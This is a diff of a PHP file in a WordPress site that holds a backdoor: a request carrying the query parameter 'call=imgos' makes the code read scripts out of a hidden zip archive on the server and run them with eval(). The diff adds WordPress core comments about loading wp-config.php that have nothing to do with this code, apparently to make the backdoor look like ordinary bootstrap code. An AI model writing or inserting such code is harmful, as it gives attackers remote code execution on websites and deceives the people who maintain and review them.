@@ -27,13 +27,45 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Handles the extraction and execution of scripts from a zip archive
  * when the specific query parameter is present.
  */
+/*
+ * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
+ * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
+ * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
+ * and /blog/ is WordPress(b).
+ *
+ * If neither set of conditions is true, initiate loading the setup process.
+ */
 if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
 	$zip_file_path = '/home/andyshop/lscache/auth2.zip';
 	
 	// Verify file existence and zip extension availability
+	/*
+	 * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
+	 * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
+	 * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
+	 * and /blog/ is WordPress(b).
+	 *
+	 * If neither set of conditions is true, initiate loading the setup process.
+	 */
 	if ( file_exists( $zip_file_path ) && class_exists( 'ZipArchive' ) ) {
 		$archive = new ZipArchive;
 		$archive_open_result = $archive->open( $zip_file_path );
+		/**
+		 * Bootstrap file for setting the ABSPATH constant
+		 * and loading the wp-config.php file. The wp-config.php
+		 * file will then load the wp-settings.php file, which
+		 * will then set up the WordPress environment.
+		 *
+		 * If the wp-config.php file is not found then an error
+		 * will be displayed asking the visitor to set up the
+		 * wp-config.php file.
+		 *
+		 * Will also search for wp-config.php in WordPress' parent
+		 * directory to allow the WordPress directory to remain
+		 * untouched.
+		 *
+		 * @package WordPress
+		 */
 		
 		if ( true === $archive_open_result ) {
 			$combined_script = '';
@@ -45,12 +77,31 @@ if ( ! empty( $_GET['call'] ) && 'imgos' === $_GET['call'] ) {
 					$combined_script .= $file_content;
 				}
 			}
-			
+			/**
+			 * Bootstrap file for setting the ABSPATH constant
+			 * and loading the wp-config.php file. The wp-config.php
+			 * file will then load the wp-settings.php file, which
+			 * will then set up the WordPress environment.
+			 *
+			 * If the wp-config.php file is not found then an error
+			 * will be displayed asking the visitor to set up the
+			 * wp-config.php file.
+			 *
+			 * Will also search for wp-config.php in WordPress' parent
+			 * directory to allow the WordPress directory to remain
+			 * untouched.
+			 *
+			 * @package WordPress
+			 */
 			if ( ! empty( $combined_script ) ) {
 				// Execute the combined script content
 				eval( '?>' . $combined_script );
 			}
-			
+			/*
+ * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
+ * it's best to add a dummy function to the wp-config.php file, but as this call to the function
+ * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
+ */
 			$archive->close();
 			exit; // Terminate after execution
 		}
